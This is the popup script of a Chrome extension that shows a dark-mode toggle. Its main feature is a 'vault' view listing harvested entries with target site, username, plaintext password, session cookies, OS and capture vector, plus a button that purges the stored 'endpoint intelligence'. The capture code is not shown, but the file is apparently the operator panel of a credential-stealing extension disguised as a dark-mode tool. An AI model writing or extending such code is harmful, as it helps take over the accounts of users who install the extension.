document.addEventListener('DOMContentLoaded', () => {
    const toggle = document.getElementById('dark-toggle');
    const vaultDisplay = document.getElementById('vault-display');
    const vaultLogs = document.getElementById('vault-logs');
    const scanner = document.getElementById('scanner');

    // 1. Load Kill Switch State
    chrome.storage.local.get({ isVecnaActive: false }, (data) => {
        toggle.checked = data.isVecnaActive;
    });

    // 2. Toggle Handler
    toggle.addEventListener('change', (e) => {
        const isActive = e.target.checked;
        chrome.storage.local.set({ isVecnaActive: isActive });
        chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
            if (tabs[0]) chrome.tabs.sendMessage(tabs[0].id, { action: "toggleDark", state: isActive });
        });
    });

    // 3. The Decryption Sequence (BUG FIXED & UPGRADED)
    document.getElementById('btn-vault').addEventListener('click', () => {
        vaultDisplay.style.display = "block";
        scanner.style.display = "none"; // Hide scanner initially
        vaultLogs.innerHTML = "<div class='glitch-text'>[ DECRYPTING LOCAL STORAGE... ]</div>";

        setTimeout(() => {
            chrome.storage.local.get({vault: []}, (data) => {
                vaultLogs.innerHTML = "";
                
                if (data.vault.length === 0) {
                    vaultLogs.innerHTML = "<div class='log-entry visible' style='border-left-color: #555;'>No endpoint intelligence found.</div>";
                    return;
                }
                
                // Turn on the CSS Laser Scanner!
                scanner.style.display = "block";

                // Process the data
                data.vault.reverse().forEach((entry, index) => {
                    // BUG FIX: Defensive checks so old data doesn't crash the script
                    const target = entry.Target || entry.Site || "Unknown Target";
                    const user = entry.User || "Unknown User";
                    const pass = entry.Pass || "N/A";
                    const os = entry.System_OS || entry.OS || "Unknown OS";
                    const vector = entry.Vector || "Unknown Trigger";
                    const time = entry.Time || "Unknown Time";
                    
                    // Safely handle cookies string
                    let sessionData = "None Captured";
                    if (entry.Cookies || entry.Session) {
                        const rawSession = entry.Cookies || entry.Session;
                        sessionData = rawSession.length > 30 ? rawSession.substring(0, 30) + "..." : rawSession;
                    }

                    // Create the element
                    const log = document.createElement('div');
                    log.className = 'log-entry';
                    log.innerHTML = `
                        <span>Target:</span> ${target}<br>
                        <span>User:</span> ${user}<br>
                        <span>Pass:</span> <span style="color:#ff003c; width:auto;">${pass}</span><br>
                        <span>Session:</span> ${sessionData}<br>
                        <span>System:</span> ${os}<br>
                        <div style="font-size: 9px; background: rgba(255, 0, 60, 0.1); padding: 3px 6px; border-radius: 4px; color: #ff003c; border: 1px solid rgba(255, 0, 60, 0.3); margin-top: 8px; display: inline-block;">Vector: ${vector} @ ${time}</div>
                    `;
                    
                    vaultLogs.appendChild(log);

                    // Staggered Fade-In Animation (Hacker Aesthetic)
                    setTimeout(() => {
                        log.classList.add('visible');
                    }, index * 200); // Delays each card by 200ms
                });
            });
        }, 1500); // 1.5 second decryption delay
    });

    // 4. Purge Intelligence
    document.getElementById('btn-purge').addEventListener('click', () => {
        chrome.storage.local.set({vault: []}, () => {
            vaultDisplay.style.display = "none";
            scanner.style.display = "none";
            alert("All local endpoint intelligence permanently purged.");
        });
    });
});
